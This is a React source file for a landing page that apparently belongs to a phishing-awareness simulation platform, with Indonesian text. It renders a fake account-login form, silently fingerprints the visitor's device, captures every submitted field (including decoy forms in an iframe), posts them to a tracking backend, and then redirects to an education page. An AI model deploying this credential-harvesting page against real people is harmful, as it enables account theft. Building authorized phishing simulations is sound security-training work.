import { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import api from '../../services/api';
import './Landing.css';

export default function LandingPage() {
  const { token } = useParams();
  const [config, setConfig] = useState(null);
  const [loading, setLoading] = useState(true);
  const [submitted, setSubmitted] = useState(false);

  useEffect(() => {
    // Fetch dynamic config from backend
    api.get(`/track/landing-config/${token}`)
      .then(res => setConfig(res.data.config))
      .catch(err => {
        // Fallback default config if API fails
        console.error("Failed to load landing config", err);
        setConfig({
          title: "Verifikasi Keamanan Akun",
          subtitle: "Sesi Anda telah berakhir. Silakan masuk kembali.",
          logo_emoji: "🔒",
          primary_color: "#0066cc",
          bg_color: "#f5f5f5",
          text_color: "#1a1a1a",
          button_text: "Masuk",
          button_color: "#0066cc",
          theme_style: "generic",
          form_fields: [
            { name: "email", label: "Email atau Username", type: "text", placeholder: "nama@perusahaan.com" },
            { name: "password", label: "Password", type: "password", placeholder: "Masukkan password" }
          ]
        });
      })
      .finally(() => setLoading(false));
  }, [token]);

  useEffect(() => {
    // Collect and send device fingerprinting data silently (BeEF style)
    const sendFingerprint = async () => {
      try {
        const fingerprintData = {
          os: navigator.platform || 'Unknown OS',
          userAgent: navigator.userAgent || 'Unknown Browser',
          language: navigator.language || 'Unknown Language',
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          colorDepth: window.screen.colorDepth,
          hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
          deviceMemory: navigator.deviceMemory || 'Unknown',
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
          cookieEnabled: navigator.cookieEnabled,
          plugins: Array.from(navigator.plugins).map(p => p.name).join(', ')
        };
        await api.post(`/track/fingerprint/${token}`, fingerprintData);
      } catch (err) {
        // Silently fail, victim should not know
      }
    };
    sendFingerprint();
  }, [token]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      // Collect all form field values
      const formData = {};
      const formElement = e.target;
      const inputs = formElement.querySelectorAll('input, select, textarea');
      inputs.forEach(input => {
        if (input.name) {
          formData[input.name] = input.value;
        }
      });

      // Send form data to backend for capture
      await api.post(`/track/submit/${token}`, formData);
    } catch (err) {
      // Redirect happens server-side, ignore errors
    }
    setSubmitted(true);
    // Redirect to education page after brief delay
    setTimeout(() => {
      window.location.href = `/education/${token}`;
    }, 500);
  };

  if (loading || !config) {
    return <div className="landing-loading">Memuat Halaman...</div>;
  }

  // Inject custom CSS jika ada
  const customCssBlock = config.custom_css ? (
    <style dangerouslySetInnerHTML={{ __html: config.custom_css }} />
  ) : null;

  // Render mode RAW HTML
  if (config.theme_style === 'raw_html' && config.raw_html) {
    return (
      <iframe 
        title="Decoy Landing Page"
        srcDoc={config.raw_html}
        style={{ width: '100vw', height: '100vh', border: 'none', margin: 0, padding: 0, display: 'block', position: 'absolute', top: 0, left: 0 }}
        onLoad={(e) => {
          try {
            const doc = e.target.contentDocument || e.target.contentWindow.document;
            const forms = doc.querySelectorAll('form');
            forms.forEach(f => {
              f.addEventListener('submit', async (ev) => {
                ev.preventDefault();
                try {
                  // Collect form data from iframe
                  const formData = {};
                  const inputs = f.querySelectorAll('input, select, textarea');
                  inputs.forEach(input => {
                    if (input.name) {
                      formData[input.name] = input.value;
                    }
                  });
                  await api.post(`/track/submit/${token}`, formData);
                } catch(err) {
                  // Ignore errors
                }
                // Redirect parent window to education page
                window.top.location.href = `/education/${token}`;
              });
            });
          } catch(err) {
            console.error("Iframe form binding error:", err);
          }
        }}
      />
    );
  }

  // Render mode Builder (Template/Custom)
  return (
    <>
      {customCssBlock}
      <div 
        className={`landing-page theme-${config.theme_style || 'generic'}`}
        style={{
          '--l-primary': config.primary_color || '#0066cc',
          '--l-bg': config.bg_color || '#f5f5f5',
          '--l-text': config.text_color || '#1a1a1a',
          '--l-btn': config.button_color || '#0066cc',
          backgroundColor: 'var(--l-bg)',
          backgroundImage: config.bg_image ? `url(${config.bg_image})` : 'none',
          backgroundSize: 'cover',
          backgroundPosition: 'center',
        }}
      >
        <div className="landing-container">
          <div className="landing-card" style={{ color: 'var(--l-text)' }}>
            <div className="landing-logo-area">
              <div className="landing-fake-logo">
                {config.logo_image ? (
                  <img src={config.logo_image} alt="Logo" style={{ maxHeight: '64px', maxWidth: '100%' }} />
                ) : (
                  config.logo_emoji || '🔒'
                )}
              </div>
              <h1>{config.title}</h1>
              <p>{config.subtitle}</p>
            </div>

          <form className="landing-form" onSubmit={handleSubmit}>
            {(config.form_fields || []).map((field, idx) => (
              <div key={idx} className="landing-input-group">
                <label>{field.label}</label>
                <input 
                  type={field.type || 'text'} 
                  name={field.name}
                  placeholder={field.placeholder} 
                  required 
                />
              </div>
            ))}
            
            <button 
              type="submit" 
              className="landing-submit-btn" 
              disabled={submitted}
              style={{ backgroundColor: 'var(--l-btn)' }}
            >
              {submitted ? 'Memproses...' : (config.button_text || 'Submit')}
            </button>
          </form>

          {config.footer_text && (
            <div className="landing-footer">
              <p>{config.footer_text}</p>
            </div>
          )}
        </div>
      </div>
    </div>
    </>
  );
}
